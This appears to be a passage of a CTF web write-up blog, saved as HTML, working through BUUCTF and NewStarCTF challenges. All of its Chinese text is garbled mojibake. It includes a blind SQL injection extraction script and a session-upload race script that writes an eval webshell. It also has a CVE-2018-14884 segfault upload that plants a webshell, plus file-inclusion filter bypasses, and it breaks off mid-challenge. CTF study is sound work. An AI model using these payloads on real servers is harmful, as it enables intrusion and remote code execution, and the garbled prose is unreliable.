alt="image-20240117183243963"></p><p>è„šæœ¬</p><p>çˆ†ç ´åº“å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://4ab3b0b2-91a3-428c-8245-12cd01dcf1cb.node5.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        payload1 = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        r = requests.get(url=base_url + payload1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    data += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240117183421468.png" alt="image-20240117183421468"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://4ab3b0b2-91a3-428c-8245-12cd01dcf1cb.node5.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;if(ascii(substr((select(group_concat(flag,&#x27;---&#x27;,value))from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        payload1 = payload4.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        r = requests.get(url=base_url + payload1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    data += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºflag</p><p><img src="/../images/image-20240117183614666.png" alt="image-20240117183614666"></p><h1 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h1><p>F12æŸ¥çœ‹</p><p><img src="/../images/image-20240118184000488.png" alt="image-20240118184000488"></p><p>å‘ç°chase</p><p>ä½†æ˜¯è®¿é—®&#x2F;chase&#x2F;ä¼šè·³è½¬åˆ°&#x2F;die</p><p><img src="/../images/image-20240118184048491.png" alt="image-20240118184048491"></p><p>æŠ“åŒ…ï¼Œå‘ç°&#x2F;leftt&#x2F;</p><p><img src="/../images/image-20240118184211749.png" alt="image-20240118184211749"></p><p>è®¿é—®&#x2F;leftt&#x2F;,å‘ç°&#x2F;shoot&#x2F;</p><p><img src="/../images/image-20240118184255968.png" alt="image-20240118184255968"></p><p>è®¿é—®&#x2F;shoot&#x2F;ï¼Œå‘ç°&#x2F;door&#x2F;</p><p><img src="/../images/image-20240118184332106.png" alt="image-20240118184332106"></p><p>è®¿é—®&#x2F;door&#x2F;ï¼Œå‘ç°&#x2F;static&#x2F;js&#x2F;door.jså’Œcheck_door()</p><p><img src="/../images/image-20240118184519281.png" alt="image-20240118184519281"></p><p><img src="/../images/image-20240118184543144.png" alt="image-20240118184543144"></p><p>è®¿é—®&#x2F;static&#x2F;js&#x2F;door.jsï¼Œå‘ç°&#x2F;open&#x2F;</p><p><img src="/../images/image-20240118184901302.png" alt="image-20240118184901302"></p><p>è®¿é—®&#x2F;open&#x2F;</p><p><img src="/../images/image-20240118184957814.png" alt="image-20240118184957814"></p><p>æŸ¥çœ‹&#x2F;static&#x2F;js&#x2F;open_sesame.js</p><p><img src="/../images/image-20240118185027968.png" alt="image-20240118185027968"></p><p>æŸ¥çœ‹&#x2F;fight&#x2F;</p><p><img src="/../images/image-20240118185107946.png" alt="image-20240118185107946"></p><p>æŸ¥çœ‹&#x2F;static&#x2F;js&#x2F;fight.js</p><p><img src="/../images/image-20240118185142190.png" alt="image-20240118185142190"></p><p>é‚£ä¹ˆflagå°±æ˜¯ç”±ä»¥ä¸‹ç»„æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;</span><br></pre></td></tr></table></figure><p>ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line"><span class="comment"># å¯¹flagå­—å…¸é‡Œçš„å†…å®¹è¿›è¡Œæ’åˆ—ç»„åˆ</span></span><br><span class="line">item = permutations(flag)</span><br><span class="line"><span class="comment"># éå†</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> item:</span><br><span class="line">    k = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(a))</span><br><span class="line">    <span class="comment"># åŒ¹é…</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&#x27;^pctf\&#123;hey_boys[a-zA-z_]+ck!\&#125;$&#x27;</span>, k):</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ä¸ªå°±æ˜¯flag</p><p><img src="/../images/image-20240118185658068.png" alt="image-20240118185658068"></p><h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><p>æ‰“å¼€ç¯å¢ƒï¼Œæç¤ºéœ€è¦<strong>md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass</strong></p><p><img src="/../images/image-20240119203706569.png" alt="image-20240119203706569"></p><p>GETä¼ å‚name&#x3D;1å¾—åˆ°hashå€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">576322dd496b99d07b5b0f7fa7934a25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240119203848632.png" alt="image-20240119203848632"></p><p>GETä¼ å‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25</span><br></pre></td></tr></table></figure><p>ä¼šè·³è½¬åˆ°404.htmlï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°flflflflag.php</p><p><img src="/../images/image-20240119204053742.png" alt="image-20240119204053742"></p><p>è®¿é—®flflflflag.phpï¼Œå¯ä»¥çœ‹åˆ°includeå‡½æ•°</p><p><img src="/../images/image-20240119204210758.png" alt="image-20240119204210758"></p><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«è¯»å–ï¼Œå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹fileç¦ç”¨&#x2F;data|input|zip&#x2F;is</p><h2 id="sessionæ–‡ä»¶åŒ…å«"><a href="#sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«"></a>sessionæ–‡ä»¶åŒ…å«</h2><p>åˆ©ç”¨session.upload_processä¸Šä¼ ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æœ‰æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ä»£ç ï¼ŒåŒ…å«å®ƒä»è€Œæ‰§è¡Œé‡Œé¢çš„ä»£ç ã€‚</p><p>å› ä¸ºè¯¥æ–‡ä»¶å†…å®¹æ¸…ç©ºå¾ˆå¿«ï¼Œæ‰€ä»¥éœ€è¦ä¸åœçš„ä¸Šä¼ å’ŒåŒ…å«ï¼Œåœ¨æ¸…ç©ºä¹‹å‰åŒ…å«è¯¥æ–‡ä»¶ã€‚</p><p>sessionä¸­ä¸€éƒ¨åˆ†æ•°æ®(session.upload_process.name)æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œåœ¨Cookieä¸­è®¾ç½®PHPSESSID&#x3D;yym68686ï¼ŒåŒæ—¶POSTä¸€ä¸ªæ¶æ„çš„å­—æ®µï¼Œåªè¦ä¸Šä¼ åŒ…é‡Œé¢å¸¦ä¸Šè¿™ä¸ªé”®ï¼ŒPHPå°±ä¼šå¯åŠ¨Sessionã€‚åŒæ—¶ï¼Œæˆ‘ä»¬åœ¨Cookieä¸­è®¾ç½®PHPSESSID&#x3D;yym68686ï¼ŒSessionæ–‡ä»¶ä¼šè‡ªåŠ¨åˆ›å»ºã€‚</p><p>å½“ä¸Šä¼ ç»“æŸåï¼Œphpä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œå¯¼è‡´æˆ‘ä»¬åœ¨åŒ…å«sessionçš„æ—¶å€™ç›¸å½“äºåœ¨åŒ…å«ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œæ²¡æœ‰åŒ…å«æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„ä»£ç ã€‚æ‰€ä»¥éœ€è¦åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œåœ¨æ–‡ä»¶è¢«æ¸…é™¤å‰åˆ©ç”¨ã€‚</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://9a375164-9802-4d2f-893a-b2d268aeef98.node5.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session,))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><p>è„šæœ¬è¿è¡Œç»“æŸï¼Œå‘åŒ…æ‰¾åˆ°flag</p><p><img src="/../images/image-20240119205221325.png" alt="image-20240119205221325"></p><p><img src="/../images/image-20240119205207411.png" alt="image-20240119205207411"></p><h2 id="åˆ©ç”¨php7-segment-faultç‰¹æ€§-CVE-2018-14884"><a href="#åˆ©ç”¨php7-segment-faultç‰¹æ€§-CVE-2018-14884" class="headerlink" title="åˆ©ç”¨php7 segment faultç‰¹æ€§(CVE-2018-14884)"></a>åˆ©ç”¨php7 segment faultç‰¹æ€§(CVE-2018-14884)</h2><p>phpä»£ç ä¸­ä½¿ç”¨php:&#x2F;&#x2F;filterçš„strip_tagsè¿‡æ»¤å™¨ï¼Œå¯ä»¥è®©phpæ‰§è¡Œçš„æ—¶å€™ç›´æ¥å‡ºç°Segment Faultï¼Œè¿™æ ·phpçš„åƒåœ¾å›æ”¶æœºåˆ¶å°±ä¸ä¼šåœ¨ç»§ç»­æ‰§è¡Œï¼Œå¯¼è‡´POSTä¸Šä¼ çš„æ–‡ä»¶å°±ä¼šä¿å­˜åœ¨ç³»ç»Ÿçš„ç¼“å­˜ç›®å½•è€Œä¸ä¼šè¢«åˆ é™¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ç›´åˆ°è¿™ä¸ªæ–‡ä»¶åå°±å¯ä»¥æ‰§è¡Œä»£ç ã€‚<br>php:&#x2F;&#x2F;filter&#x2F;strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼ŒåŸå› æ˜¯å­˜åœ¨ä¸€å¤„ç©ºæŒ‡é’ˆå¼•ç”¨ï¼Œå‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œä½¿å¾—PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼Œä½†æ˜¯ä¸Šä¼ çš„æ–‡ä»¶è¢«ä¿ç•™ï¼Œé»˜è®¤åœ¨tmpç›®å½•ä¸‹ã€‚<br>é€‚ç”¨ç‰ˆæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤</span><br><span class="line">php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤</span><br><span class="line">php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO <span class="comment">#BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://9a375164-9802-4d2f-893a-b2d268aeef98.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®dir.php</p><p><img src="/../images/image-20240119211505668.png" alt="image-20240119211505668"></p><p>burpå‘åŒ…</p><p><img src="/../images/image-20240119211455158.png" alt="image-20240119211455158"></p><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-IncludeOne"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-IncludeOne" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]IncludeOne"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]IncludeOne</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; Hint: <span class="number">1219893521</span></span><br><span class="line">No Hacker!</span><br></pre></td></tr></table></figure><p>ä¼ªéšæœºæ•°ï¼Œå…ˆçˆ†ç ´ç§å­1145146</p><p><img src="/../images/image-20240120104630232.png" alt="image-20240120104630232"></p><p>ç”Ÿæˆéšæœºæ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1145146</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12198935211202031004</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆguess&#x3D;1202031004</p><p>è¿›å…¥ifåè¦æ±‚ä¸èƒ½æœ‰baseï¼Œä½†æ˜¯å¿…é¡»æœ‰NewStarï¼Œä½¿ç”¨ROT13ç¼–ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/NewStar/read=string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240120105343514.png" alt="image-20240120105343514"></p><p>è½¬æ¢å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f7fbb1c3-b3b6-42ff-903f-48bf0a188280&#125;</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-æ¸¸æˆé«˜æ‰‹"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-æ¸¸æˆé«˜æ‰‹" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹</h1><p><img src="/../images/image-20240120110114802.png" alt="image-20240120110114802"></p><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-So-Baby-RCE-Again"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-So-Baby-RCE-Again" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]So Baby RCE Again"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]So Baby RCE Again</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|curl/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span 